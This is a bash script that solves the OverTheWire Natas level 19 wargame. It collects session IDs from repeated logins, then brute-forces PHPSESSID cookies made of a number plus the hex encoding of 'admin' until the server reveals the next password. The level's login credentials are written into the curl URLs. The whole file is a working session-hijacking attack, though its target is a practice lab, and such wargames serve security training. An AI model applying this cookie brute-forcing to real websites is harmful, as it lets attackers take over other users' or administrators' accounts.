#!/bin/bash
fixed_part=d61646d696e
sessids=session-ids.txt
function hack() {
	for i in $(normalize-sessionids); do
		result=$(request $i 2>&1 | grep -Po "(?<=Password: )[\w\d]+")
		if [ ! -z "$result" ] ; then
			printf "$result"
			break;
		fi
	done
}

function request-login() {
	curl -vs \
		-d "username=admin&password=admin" \
		http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org?debug=debug
}

function request() {
	curl -v \
		--cookie "$(generate-attack-string $1)" \
		http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org?debug=debug
}

function generate-attack-string() {
	printf "PHPSESSID=$i$fixed_part"
}

function examine-sessionids() {
	for i in {1..10000}; do
		request-login 2>&1 | grep -Po "PHPSESSID=\d+$fixed_part" | tr "[=de]" " - " >>"$sessids"
	done
}

function normalize-sessionids() {
	cat "$sessids" | grep -Po "(?<=PHPSESSID )\d+" | sort | uniq
}
